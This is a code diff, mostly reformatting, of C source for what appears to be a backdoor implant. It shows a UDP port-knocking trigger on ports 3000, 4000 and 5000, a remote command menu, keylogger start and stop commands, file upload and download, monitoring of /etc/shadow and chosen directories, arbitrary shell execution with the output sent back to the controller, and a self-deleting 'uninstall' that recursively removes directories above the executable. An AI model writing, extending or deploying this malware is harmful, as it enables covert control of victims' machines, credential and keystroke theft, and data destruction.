@@ -20,462 +20,395 @@
 
 #define _XOPEN_SOURCE 500
 
-int listen_sequence(char *final_timestamp, size_t ts_len, char *final_ip)
-{
-    if (!final_timestamp || ts_len == 0)
-        return 0;
+int listen_sequence(char *final_timestamp, size_t ts_len, char *final_ip) {
+  if (!final_timestamp || ts_len == 0)
+    return 0;
 
-    int ports[3] = {3000, 4000, 5000};
-    int socks[3];
+  int ports[3] = {3000, 4000, 5000};
+  int socks[3];
 
-    for (int i = 0; i < 3; i++)
-    {
-        socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
-        if (socks[i] < 0)
-            return 0;
+  for (int i = 0; i < 3; i++) {
+    socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
+    if (socks[i] < 0)
+      return 0;
 
-        int yes = 1;
-        setsockopt(socks[i], SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
+    int yes = 1;
+    setsockopt(socks[i], SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
 
-        struct sockaddr_in addr = {0};
-        addr.sin_family         = AF_INET;
-        addr.sin_port           = htons(ports[i]);
-        addr.sin_addr.s_addr    = htonl(INADDR_ANY);
+    struct sockaddr_in addr = {0};
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(ports[i]);
+    addr.sin_addr.s_addr = htonl(INADDR_ANY);
 
-        if (bind(socks[i], (struct sockaddr *)&addr, sizeof(addr)) < 0)
-            return 0;
+    if (bind(socks[i], (struct sockaddr *)&addr, sizeof(addr)) < 0)
+      return 0;
+  }
+
+  printf("Listening for knock sequence 3000→4000→5000\n");
+
+  int state = 0;
+  time_t start_time = 0;
+  char expected_ip[INET_ADDRSTRLEN] = {0};
+
+  unsigned char buf[2048];
+
+  while (1) {
+    fd_set rfds;
+    FD_ZERO(&rfds);
+
+    int maxfd = 0;
+    for (int i = 0; i < 3; i++) {
+      FD_SET(socks[i], &rfds);
+      if (socks[i] > maxfd)
+        maxfd = socks[i];
     }
 
-    printf("Listening for knock sequence 3000→4000→5000\n");
+    struct timeval tv = {1, 0};
+    int r = select(maxfd + 1, &rfds, NULL, NULL, &tv);
+    if (r < 0)
+      continue;
 
-    int    state                        = 0;
-    time_t start_time                   = 0;
-    char   expected_ip[INET_ADDRSTRLEN] = {0};
-
-    unsigned char buf[2048];
-
-    while (1)
-    {
-        fd_set rfds;
-        FD_ZERO(&rfds);
-
-        int maxfd = 0;
-        for (int i = 0; i < 3; i++)
-        {
-            FD_SET(socks[i], &rfds);
-            if (socks[i] > maxfd)
-                maxfd = socks[i];
-        }
-
-        struct timeval tv = {1, 0};
-        int            r  = select(maxfd + 1, &rfds, NULL, NULL, &tv);
-        if (r < 0)
-            continue;
-
-        if (state != 0)
-        {
-            time_t now = time(NULL);
-            if (difftime(now, start_time) > 30)
-            {
-                printf("30s timeout — resetting\n");
-                state          = 0;
-                expected_ip[0] = '\0';
-                continue;
-            }
-        }
-
-        for (int i = 0; i < 3; i++)
-        {
-            if (!FD_ISSET(socks[i], &rfds))
-                continue;
-
-            struct sockaddr_in src;
-            socklen_t          srclen = sizeof(src);
-            ssize_t            n      = recvfrom(socks[i], buf, sizeof(buf), 0,
-                                                 (struct sockaddr *)&src, &srclen);
-            if (n <= 0)
-                continue;
-
-            char ip[INET_ADDRSTRLEN];
-            inet_ntop(AF_INET, &src.sin_addr, ip, sizeof(ip));
-
-            int port_index = i;
-
-            if (state == 0 && port_index == 0)
-            {
-                strcpy(expected_ip, ip);
-                start_time = time(NULL);
-                state      = 1;
-                printf("Step 1 OK from %s\n", ip);
-            }
-            else if (state == 1 && port_index == 1)
-            {
-                if (strcmp(ip, expected_ip) == 0)
-                {
-                    state = 2;
-                    printf("Step 2 OK\n");
-                }
-                else
-                {
-                    printf("Wrong IP at step 2 — reset\n");
-                    state = 0;
-                }
-            }
-            else if (state == 2 && port_index == 2)
-            {
-                if (strcmp(ip, expected_ip) == 0)
-                {
-                    time_t    t = time(NULL);
-                    struct tm tm;
-                    localtime_r(&t, &tm);
-                    strftime(final_timestamp, ts_len,
-                             "%Y-%m-%d %H:%M:%S", &tm);
-
-                    printf("Sequence complete from %s\n", ip);
-
-                    for (int j = 0; j < 3; j++)
-                        close(socks[j]);
-
-                    strcpy(final_ip, ip);
-
-                    return 1;
-                }
-                else
-                {
-                    printf("Wrong IP at step 3 — reset\n");
-                    state = 0;
-                }
-            }
-            else
-            {
-                state = 0;
-            }
-        }
+    if (state != 0) {
+      time_t now = time(NULL);
+      if (difftime(now, start_time) > 30) {
+        printf("30s timeout — resetting\n");
+        state = 0;
+        expected_ip[0] = '\0';
+        continue;
+      }
     }
+
+    for (int i = 0; i < 3; i++) {
+      if (!FD_ISSET(socks[i], &rfds))
+        continue;
+
+      struct sockaddr_in src;
+      socklen_t srclen = sizeof(src);
+      ssize_t n = recvfrom(socks[i], buf, sizeof(buf), 0,
+                           (struct sockaddr *)&src, &srclen);
+      if (n <= 0)
+        continue;
+
+      char ip[INET_ADDRSTRLEN];
+      inet_ntop(AF_INET, &src.sin_addr, ip, sizeof(ip));
+
+      int port_index = i;
+
+      if (state == 0 && port_index == 0) {
+        strcpy(expected_ip, ip);
+        start_time = time(NULL);
+        state = 1;
+        printf("Step 1 OK from %s\n", ip);
+      } else if (state == 1 && port_index == 1) {
+        if (strcmp(ip, expected_ip) == 0) {
+          state = 2;
+          printf("Step 2 OK\n");
+        } else {
+          printf("Wrong IP at step 2 — reset\n");
+          state = 0;
+        }
+      } else if (state == 2 && port_index == 2) {
+        if (strcmp(ip, expected_ip) == 0) {
+          time_t t = time(NULL);
+          struct tm tm;
+          localtime_r(&t, &tm);
+          strftime(final_timestamp, ts_len, "%Y-%m-%d %H:%M:%S", &tm);
+
+          printf("Sequence complete from %s\n", ip);
+
+          for (int j = 0; j < 3; j++)
+            close(socks[j]);
+
+          strcpy(final_ip, ip);
+
+          return 1;
+        } else {
+          printf("Wrong IP at step 3 — reset\n");
+          state = 0;
+        }
+      } else {
+        state = 0;
+      }
+    }
+  }
 }
 
-menu_option receive_menu_option(struct ip_info ip_ctx)
-{
-    char *cmd = NULL;
+menu_option receive_menu_option(struct ip_info ip_ctx, int sock) {
+  char *cmd = NULL;
 
-    // uint16_t w[6];
-    // for (int i = 0; i < 6; i++)
-    // {
-    //     recv_message(ip_ctx, &w[i]);
-    //     printf("peek[%d]=%u (0x%04x)\n", i, w[i], w[i]);
-    // }
+  // uint16_t w[6];
+  // for (int i = 0; i < 6; i++)
+  // {
+  //     recv_message(ip_ctx, &w[i]);
+  //     printf("peek[%d]=%u (0x%04x)\n", i, w[i], w[i]);
+  // }
 
-    if (receive_string(ip_ctx, &cmd) != 0)
-    {
-        printf("Error jfan\n");
-        return LISTEN;
-    }
+  if (receive_string(ip_ctx, &cmd, sock) != 0) {
+    printf("Error jfan\n");
+    return LISTEN;
+  }
 
-    printf("len(str)=%zu\n", strlen(cmd));
-    for (size_t i = 0; i < strlen(cmd) && i < 16; i++)
-        printf("%02x ", (unsigned char)cmd[i]);
-    printf("\n");
+  printf("len(str)=%zu\n", strlen(cmd));
+  for (size_t i = 0; i < strlen(cmd) && i < 16; i++)
+    printf("%02x ", (unsigned char)cmd[i]);
+  printf("\n");
 
-    printf("Recievedi: %s\n", cmd);
+  printf("Recievedi: %s\n", cmd);
 
-    menu_option opt = LISTEN;
+  menu_option opt = LISTEN;
 
-    if (strcmp(cmd, "2.") == 0)
-    {
-        opt = DISCONNECT;
-    }
-    else if (strcmp(cmd, "3.") == 0)
-    {
-        opt = UNINSTALL;
-    }
-    else if (strcmp(cmd, "4.") == 0)
-    {
-        opt = START_KEYLOG;
-    }
-    else if (strcmp(cmd, "5.") == 0)
-    {
-        opt = STOP_KEYLOG;
-    }
-    else if (strcmp(cmd, "6.") == 0)
-    {
-        opt = GET_FILE;
-    }
-    else if (strcmp(cmd, "7.") == 0)
-    {
-        opt = TRANSFER_FILE_TO;
-    }
-    else if (strcmp(cmd, "8.") == 0)
-    {
-        opt = WATCH_FILE;
-    }
-    else if (strcmp(cmd, "9.") == 0)
-    {
-        opt = WATCH_DIR;
-    }
-    else if (strcmp(cmd, "10") == 0 || strcmp(cmd, "10.") == 0)
-    {
-        opt = RUN_PROGRAM;
-    }
+  if (strcmp(cmd, "2.") == 0) {
+    opt = DISCONNECT;
+  } else if (strcmp(cmd, "3.") == 0) {
+    opt = UNINSTALL;
+  } else if (strcmp(cmd, "4.") == 0) {
+    opt = START_KEYLOG;
+  } else if (strcmp(cmd, "5.") == 0) {
+    opt = STOP_KEYLOG;
+  } else if (strcmp(cmd, "6.") == 0) {
+    opt = GET_FILE;
+  } else if (strcmp(cmd, "7.") == 0) {
+    opt = TRANSFER_FILE_TO;
+  } else if (strcmp(cmd, "8.") == 0) {
+    opt = WATCH_FILE;
+  } else if (strcmp(cmd, "9.") == 0) {
+    opt = WATCH_DIR;
+  } else if (strcmp(cmd, "10") == 0 || strcmp(cmd, "10.") == 0) {
+    opt = RUN_PROGRAM;
+  }
 
-    free(cmd);
-    return opt;
+  free(cmd);
+  return opt;
 }
 
-int run_command_string(const char *cmd, char **output)
-{
-    if (!cmd || !output)
-        return -1;
-    *output = NULL;
+int run_command_string(const char *cmd, char **output) {
+  if (!cmd || !output)
+    return -1;
+  *output = NULL;
 
-    int pipefd[2];
-    if (pipe(pipefd) < 0)
-    {
-        perror("pipe");
-        return -1;
-    }
+  int pipefd[2];
+  if (pipe(pipefd) < 0) {
+    perror("pipe");
+    return -1;
+  }
 
-    pid_t pid = fork();
-    if (pid < 0)
-    {
-        perror("fork");
-        close(pipefd[0]);
-        close(pipefd[1]);
-        return -1;
-    }
+  pid_t pid = fork();
+  if (pid < 0) {
+    perror("fork");
+    close(pipefd[0]);
+    close(pipefd[1]);
+    return -1;
+  }
 
-    if (pid == 0)
-    {
-        close(pipefd[0]);
-        if (dup2(pipefd[1], STDOUT_FILENO) < 0)
-            _exit(127);
-        if (dup2(pipefd[1], STDERR_FILENO) < 0)
-            _exit(127);
-        close(pipefd[1]);
-
-        execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
-        _exit(127);
-    }
-
+  if (pid == 0) {
+    close(pipefd[0]);
+    if (dup2(pipefd[1], STDOUT_FILENO) < 0)
+      _exit(127);
+    if (dup2(pipefd[1], STDERR_FILENO) < 0)
+      _exit(127);
     close(pipefd[1]);
 
-    size_t cap = READ_CHUNK;
-    size_t len = 0;
-    char  *buf = (char *)malloc(cap);
-    if (!buf)
-    {
+    execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
+    _exit(127);
+  }
+
+  close(pipefd[1]);
+
+  size_t cap = READ_CHUNK;
+  size_t len = 0;
+  char *buf = (char *)malloc(cap);
+  if (!buf) {
+    close(pipefd[0]);
+    return -1;
+  }
+
+  char tmp[READ_CHUNK];
+  ssize_t n;
+  while ((n = read(pipefd[0], tmp, sizeof(tmp))) > 0) {
+    if (len + (size_t)n + 1 > cap) {
+      cap = (len + (size_t)n + 1) * 2;
+      char *nb = (char *)realloc(buf, cap);
+      if (!nb) {
+        free(buf);
         close(pipefd[0]);
         return -1;
+      }
+
+      buf = nb;
     }
 
-    char    tmp[READ_CHUNK];
-    ssize_t n;
-    while ((n = read(pipefd[0], tmp, sizeof(tmp))) > 0)
-    {
-        if (len + (size_t)n + 1 > cap)
-        {
-            cap      = (len + (size_t)n + 1) * 2;
-            char *nb = (char *)realloc(buf, cap);
-            if (!nb)
-            {
-                free(buf);
-                close(pipefd[0]);
-                return -1;
-            }
+    memcpy(buf + len, tmp, (size_t)n);
+    len += (size_t)n;
+  }
 
-            buf = nb;
-        }
+  close(pipefd[0]);
+  buf[len] = '\0';
+  *output = buf;
 
-        memcpy(buf + len, tmp, (size_t)n);
-        len += (size_t)n;
-    }
-
-    close(pipefd[0]);
-    buf[len] = '\0';
-    *output  = buf;
-
-    int status = 0;
-    if (waitpid(pid, &status, 0) < 0)
-        return -1;
-
-    if (WIFEXITED(status))
-        return WEXITSTATUS(status);
+  int status = 0;
+  if (waitpid(pid, &status, 0) < 0)
     return -1;
+
+  if (WIFEXITED(status))
+    return WEXITSTATUS(status);
+  return -1;
 }
 
-int disconnect(struct ip_info ip_ctx)
-{
-    printf("Disconnected");
+int disconnect(struct ip_info ip_ctx) {
+  printf("Disconnected");
 
-    return 0;
+  return 0;
 }
 
-static int unlink_cb(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf)
-{
-    (void)sb;
-    (void)typeflag;
-    (void)ftwbuf;
+static int unlink_cb(const char *fpath, const struct stat *sb, int typeflag,
+                     struct FTW *ftwbuf) {
+  (void)sb;
+  (void)typeflag;
+  (void)ftwbuf;
 
-    int ret = remove(fpath);
-    if (ret != 0)
-        perror(fpath);
-    return ret;
+  int ret = remove(fpath);
+  if (ret != 0)
+    perror(fpath);
+  return ret;
 }
 
-static int remove_recursive(const char *path)
-{
-    return nftw(path, unlink_cb, 64, FTW_DEPTH | FTW_PHYS);
+static int remove_recursive(const char *path) {
+  return nftw(path, unlink_cb, 64, FTW_DEPTH | FTW_PHYS);
 }
 
-static int get_parent_levels(char *out, size_t out_size, int levels)
-{
-    char exe_path[PATH_MAX];
+static int get_parent_levels(char *out, size_t out_size, int levels) {
+  char exe_path[PATH_MAX];
 
-    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
-    if (len == -1)
-    {
-        perror("readlink");
-        return -1;
+  ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
+  if (len == -1) {
+    perror("readlink");
+    return -1;
+  }
+  exe_path[len] = '\0';
+
+  printf("EXE path: %s\n", exe_path);
+
+  char *dir = dirname(exe_path);
+  strncpy(out, dir, out_size);
+  out[out_size - 1] = '\0';
+
+  // Go up N levels
+  for (int i = 0; i < levels; i++) {
+    char *slash = strrchr(out, '/');
+    if (!slash || slash == out) {
+      fprintf(stderr, "Cannot go up %d levels\n", levels);
+      return -1;
     }
-    exe_path[len] = '\0';
+    *slash = '\0';
+  }
 
-    printf("EXE path: %s\n", exe_path);
-
-    char *dir = dirname(exe_path);
-    strncpy(out, dir, out_size);
-    out[out_size - 1] = '\0';
-
-    // Go up N levels
-    for (int i = 0; i < levels; i++)
-    {
-        char *slash = strrchr(out, '/');
-        if (!slash || slash == out)
-        {
-            fprintf(stderr, "Cannot go up %d levels\n", levels);
-            return -1;
-        }
-        *slash = '\0';
-    }
-
-    return 0;
+  return 0;
 }
 
-static int delete_parent_levels(int levels)
-{
-    char target[PATH_MAX];
+static int delete_parent_levels(int levels) {
+  char target[PATH_MAX];
 
-    if (get_parent_levels(target, sizeof(target), levels) != 0)
-        return -1;
+  if (get_parent_levels(target, sizeof(target), levels) != 0)
+    return -1;
 
-    printf("Deleting: %s\n", target);
+  printf("Deleting: %s\n", target);
 
-    return remove_recursive(target);
+  return remove_recursive(target);
 }
 
-int uninstall(struct ip_info ip_ctx)
-{
-    delete_parent_levels(3);
+int uninstall(struct ip_info ip_ctx) {
+  delete_parent_levels(3);
 
-    printf("Uninstalling....");
+  printf("Uninstalling....");
 
-    return 0;
+  return 0;
 }
 
-int start_keylogger(struct ip_info ip_ctx)
-{
-    send_string(ip_ctx, "4.");
+int start_keylogger(struct ip_info ip_ctx) {
+  send_string(ip_ctx, "4.");
 
-    printf("Started keylogger");
+  printf("Started keylogger");
 
-    return 0;
+  return 0;
 }
 
-int stop_keylogger(struct ip_info ip_ctx)
-{
-    send_string(ip_ctx, "5.");
+int stop_keylogger(struct ip_info ip_ctx) {
+  send_string(ip_ctx, "5.");
 
-    printf("Stopped keylogger");
+  printf("Stopped keylogger");
 
-    return 0;
+  return 0;
 }
 
-int transfer_file(struct ip_info ip_ctx)
-{
-    char *result = NULL;
+int transfer_file(struct ip_info ip_ctx, int sock) {
+  char *result = NULL;
 
-    if (receive_string(ip_ctx, &result) != 0)
-        return -1;
+  if (receive_string(ip_ctx, &result, sock) != 0)
+    return -1;
 
-    if (send_file(ip_ctx, result) != 0)
-    {
-        printf("Failed to send file: %s\n", result);
-        free(result);
-        return -1;
-    }
-
-    printf("File %s sent successfully.\n", result);
+  if (send_file(ip_ctx, result) != 0) {
+    printf("Failed to send file: %s\n", result);
     free(result);
+    return -1;
+  }
 
-    return 0;
+  printf("File %s sent successfully.\n", result);
+  free(result);
+
+  return 0;
 }
 
-int get_file(struct ip_info ip_ctx)
-{
-    receive_file(ip_ctx);
+int get_file(struct ip_info ip_ctx, int sock) {
+  receive_file(ip_ctx, sock);
 
-    return 0;
+  return 0;
 }
 
-int watch_file(struct ip_info ip_ctx)
-{
-    char *result = NULL;
+int watch_file(struct ip_info ip_ctx, int sock) {
+  char *result = NULL;
 
-    if (receive_string(ip_ctx, &result) != 0)
-        return -1;
+  if (receive_string(ip_ctx, &result, sock) != 0)
+    return -1;
 
-    if (strcmp(result, "/etc/shadow") == 0)
-    {
-        printf("watching /etc\n");
-        watch_path_shadow(ip_ctx, "/etc");
-    }
-    else
-    {
-        watch_path(ip_ctx, result);
-    }
+  if (strcmp(result, "/etc/shadow") == 0) {
+    printf("watching /etc\n");
+    watch_path_shadow(ip_ctx, "/etc", sock);
+  } else {
+    watch_path(ip_ctx, result, sock);
+  }
 
-    free(result);
+  free(result);
 
-    return 0;
+  return 0;
 }
 
-int watch_directory(struct ip_info ip_ctx)
-{
-    char *result = NULL;
+int watch_directory(struct ip_info ip_ctx, int sock) {
+  char *result = NULL;
 
-    if (receive_string(ip_ctx, &result) != 0)
-        return -1;
+  if (receive_string(ip_ctx, &result, sock) != 0)
+    return -1;
 
-    watch_path(ip_ctx, result);
+  watch_path(ip_ctx, result, sock);
 
-    free(result);
+  free(result);
 
-    return 0;
+  return 0;
 }
 
-int run_program(struct ip_info ip_ctx)
-{
-    char *result = NULL;
+int run_program(struct ip_info ip_ctx, int sock) {
+  char *result = NULL;
 
-    if (receive_string(ip_ctx, &result) != 0)
-        return -1;
+  if (receive_string(ip_ctx, &result, sock) != 0)
+    return -1;
 
-    char *output = NULL;
+  char *output = NULL;
 
-    run_command_string(result, &output);
+  run_command_string(result, &output);
 
-    if (send_string(ip_ctx, output) != 0)
-        return -1;
+  if (send_string(ip_ctx, output) != 0)
+    return -1;
 
-    free(result);
-    free(output);
-    return 0;
+  free(result);
+  free(output);
+  return 0;
 }
